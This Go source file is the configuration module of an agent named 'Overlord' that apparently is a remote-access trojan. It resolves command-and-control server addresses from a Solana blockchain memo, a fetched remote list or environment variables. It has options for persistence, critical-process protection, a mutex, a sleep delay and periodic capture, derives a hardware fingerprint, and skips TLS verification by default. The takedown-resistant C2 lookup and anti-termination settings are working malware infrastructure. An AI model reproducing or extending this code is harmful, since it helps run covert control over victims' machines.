package config

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"time"
)

var AgentVersion = "1.8.7"

var DefaultPersistence = "false"
var DefaultServerURL = "wss://127.0.0.1:5173"
var DefaultServerURLIsRaw = "false"
var DefaultServerURLIsSol = "false"
var DefaultSolAddress = ""
var DefaultSolRPCEndpoints = ""
var DefaultMutex = ""
var DefaultID = ""
var DefaultCountry = ""
var DefaultAgentToken = ""
var DefaultBuildTag = ""
var DefaultSleepSeconds = "0"
var DefaultCriticalProcess = "false"

const settingsFile = "config/settings.json"
const serverIndexFile = "config/server_index.json"

type settings struct {
	ID      string `json:"id"`
	HWID    string `json:"hwid"`
	Country string `json:"country"`
	Version string `json:"version"`
}

type serverIndexData struct {
	LastWorkingIndex int `json:"last_working_index"`
}

type Config struct {
	ServerURLs            []string
	ServerIndex           int
	RawServerListURL      string
	SolEnabled            bool
	SolAddress            string
	SolRPCEndpoints       []string
	Mutex                 string
	ID                    string
	HWID                  string
	Country               string
	OS                    string
	Arch                  string
	Version               string
	CaptureInterval       time.Duration
	DisableCapture        bool
	EnablePersistence     bool
	CriticalProcess       bool
	TLSInsecureSkipVerify bool
	TLSCAPath             string
	TLSClientCert         string
	TLSClientKey          string
	AgentToken            string
	BuildTag              string
	SleepSeconds          int
}

func Load() Config {
	server := strings.TrimSpace(os.Getenv("OVERLORD_SERVER"))
	if server == "" {
		server = DefaultServerURL
	}

	rawServerFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_RAW"))
	if rawServerFlag == "" {
		rawServerFlag = DefaultServerURLIsRaw
	}
	rawServerEnabled := isTruthy(rawServerFlag)

	solFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_SOL"))
	if solFlag == "" {
		solFlag = DefaultServerURLIsSol
	}
	solEnabled := isTruthy(solFlag)

	solAddress := strings.TrimSpace(os.Getenv("OVERLORD_SOL_ADDRESS"))
	if solAddress == "" {
		solAddress = strings.TrimSpace(DefaultSolAddress)
	}

	solRPCEndpointsStr := strings.TrimSpace(os.Getenv("OVERLORD_SOL_RPC_ENDPOINTS"))
	if solRPCEndpointsStr == "" {
		solRPCEndpointsStr = strings.TrimSpace(DefaultSolRPCEndpoints)
	}
	var solRPCEndpoints []string
	if solRPCEndpointsStr != "" {
		for _, ep := range strings.Split(solRPCEndpointsStr, ",") {
			ep = strings.TrimSpace(ep)
			if ep != "" {
				solRPCEndpoints = append(solRPCEndpoints, ep)
			}
		}
	}

	serverURLs := []string{}
	rawServerListURL := ""
	if solEnabled && solAddress != "" && len(solRPCEndpoints) > 0 {
		agentToken := strings.TrimSpace(os.Getenv("OVERLORD_AGENT_TOKEN"))
		if agentToken == "" {
			agentToken = strings.TrimSpace(DefaultAgentToken)
		}
		if urls, err := LoadServerURLsFromSolana(solAddress, agentToken, solRPCEndpoints); err != nil {
			log.Printf("[config] WARNING: failed to load server URL from Solana memo: %v", err)
		} else {
			serverURLs = urls
		}
	} else if rawServerEnabled {
		rawServerListURL = server
		if rawServerListURL != "" {
			if urls, err := LoadServerURLsFromRaw(rawServerListURL); err != nil {
				log.Printf("[config] WARNING: failed to load raw server list from %q: %v", rawServerListURL, err)
			} else {
				serverURLs = urls
			}
		}
	} else {
		for _, url := range strings.Split(server, ",") {
			normalized, err := normalizeServerURL(url)
			if err != nil {
				log.Printf("[config] WARNING: invalid server URL %q: %v", strings.TrimSpace(url), err)
				continue
			}
			if normalized != "" {
				serverURLs = append(serverURLs, normalized)
			}
		}
	}

	serverIndex := loadServerIndex()

	fileSettings := readSettings()
	defaultHWID := deriveHWID()
	interval := 20 * time.Second
	if v := strings.TrimSpace(os.Getenv("OVERLORD_CAPTURE_INTERVAL")); v != "" {
		if parsed, err := time.ParseDuration(v); err == nil && parsed > 0 {
			interval = parsed
		}
	}

	disableCapture := false
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_DISABLE_CAPTURE"))); v != "" {
		disableCapture = v == "true" || v == "1" || v == "yes"
	}

	enablePersistence := strings.ToLower(DefaultPersistence) == "true"
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_ENABLE_PERSISTENCE"))); v != "" {
		enablePersistence = v == "true" || v == "1" || v == "yes"
	}

	criticalProcess := strings.ToLower(DefaultCriticalProcess) == "true"

	tlsInsecureSkipVerify := true
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
		tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
	}
	tlsCAPath := strings.TrimSpace(os.Getenv("OVERLORD_TLS_CA"))
	tlsClientCert := strings.TrimSpace(os.Getenv("OVERLORD_TLS_CLIENT_CERT"))
	tlsClientKey := strings.TrimSpace(os.Getenv("OVERLORD_TLS_CLIENT_KEY"))
	agentToken := strings.TrimSpace(os.Getenv("OVERLORD_AGENT_TOKEN"))
	if agentToken == "" {
		agentToken = strings.TrimSpace(DefaultAgentToken)
	}

	mutex := strings.TrimSpace(os.Getenv("OVERLORD_MUTEX"))
	if mutex == "" {
		mutex = DefaultMutex
	}
	mutexLower := strings.ToLower(strings.TrimSpace(mutex))
	if mutexLower == "none" || mutexLower == "disabled" {
		mutex = ""
	}

	return Config{
		ServerURLs:            serverURLs,
		ServerIndex:           serverIndex,
		RawServerListURL:      rawServerListURL,
		SolEnabled:            solEnabled,
		SolAddress:            solAddress,
		SolRPCEndpoints:       solRPCEndpoints,
		Mutex:                 strings.TrimSpace(mutex),
		ID:                    defaultHWID,
		HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
		EnablePersistence:     enablePersistence,
		CriticalProcess:       criticalProcess,
		Country:               firstNonEmpty(strings.TrimSpace(fileSettings.Country), DefaultCountry),
		OS:                    runtime.GOOS,
		Arch:                  runtime.GOARCH,
		Version:               firstNonEmpty(fileSettings.Version, AgentVersion),
		CaptureInterval:       interval,
		DisableCapture:        disableCapture,
		TLSInsecureSkipVerify: tlsInsecureSkipVerify,
		TLSCAPath:             tlsCAPath,
		TLSClientCert:         tlsClientCert,
		TLSClientKey:          tlsClientKey,
		AgentToken:            agentToken,
		BuildTag:              strings.TrimSpace(DefaultBuildTag),
		SleepSeconds:          parseSleepSeconds(DefaultSleepSeconds),
	}
}

func isTruthy(value string) bool {
	v := strings.ToLower(strings.TrimSpace(value))
	return v == "true" || v == "1" || v == "yes" || v == "y"
}

func parseSleepSeconds(s string) int {
	n := 0
	for _, c := range strings.TrimSpace(s) {
		if c < '0' || c > '9' {
			return 0
		}
		n = n*10 + int(c-'0')
		if n > 3600 {
			return 3600
		}
	}
	return n
}

func LoadServerURLsFromRaw(rawURL string) ([]string, error) {
	trimmed := strings.TrimSpace(rawURL)
	if trimmed == "" {
		return nil, fmt.Errorf("raw server list URL is empty")
	}

	parsed, err := url.Parse(trimmed)
	if err != nil {
		return nil, err
	}

	if parsed.Scheme == "" {
		parsed.Scheme = "https"
	}

	scheme := strings.ToLower(parsed.Scheme)
	if scheme != "https" && scheme != "http" {
		return nil, fmt.Errorf("unsupported raw server list scheme: %s", parsed.Scheme)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(parsed.String())
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("unexpected status code %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	urls := []string{}
	seen := map[string]struct{}{}
	scanner := bufio.NewScanner(bytes.NewReader(body))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		normalized, err := normalizeServerURL(line)
		if err != nil {
			log.Printf("[config] WARNING: invalid server URL in raw list %q: %v", line, err)
			continue
		}
		if normalized == "" {
			continue
		}
		if _, ok := seen[normalized]; ok {
			continue
		}
		seen[normalized] = struct{}{}
		urls = append(urls, normalized)
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	if len(urls) == 0 {
		return nil, fmt.Errorf("raw server list returned no valid URLs")
	}

	return urls, nil
}

func loadServerIndex() int {
	bytes, err := os.ReadFile(serverIndexFile)
	if err != nil {
		return 0
	}
	var data serverIndexData
	if err := json.Unmarshal(bytes, &data); err != nil {
		return 0
	}
	return data.LastWorkingIndex
}

func SaveServerIndex(index int) error {
	data := serverIndexData{LastWorkingIndex: index}
	bytes, err := json.Marshal(data)
	if err != nil {
		return err
	}
	return os.WriteFile(serverIndexFile, bytes, 0644)
}

func readSettings() settings {
	bytes, err := os.ReadFile(settingsFile)
	if err != nil {
		return settings{}
	}
	var s settings
	if err := json.Unmarshal(bytes, &s); err != nil {
		return settings{}
	}
	return s
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

func deriveHWID() string {
	machineID := platformMachineID()
	if machineID != "" {
		h := sha256.New()
		h.Write([]byte(machineID))
		h.Write([]byte("|"))
		h.Write([]byte(runtime.GOOS))
		return hex.EncodeToString(h.Sum(nil))
	}
	// fallback
	h := sha256.New()
	h.Write([]byte(hostname()))
	h.Write([]byte("|"))
	h.Write([]byte(os.Getenv("USERNAME")))
	h.Write([]byte("|"))
	h.Write([]byte(runtime.GOOS))
	return hex.EncodeToString(h.Sum(nil))
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

func normalizeServerURL(raw string) (string, error) {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return "", nil
	}

	normalized := trimmed
	if !strings.Contains(normalized, "://") {
		normalized = "wss://" + normalized
	}

	parsed, err := url.Parse(normalized)
	if err != nil {
		return "", err
	}

	switch strings.ToLower(parsed.Scheme) {
	case "ws", "wss":
	case "http":
		parsed.Scheme = "ws"
	case "https":
		parsed.Scheme = "wss"
	default:
		return "", fmt.Errorf("unsupported scheme: %s", parsed.Scheme)
	}

	if parsed.Host == "" {
		return "", fmt.Errorf("missing host")
	}

	parsed.Path = strings.TrimRight(parsed.Path, "/")
	return parsed.String(), nil
}
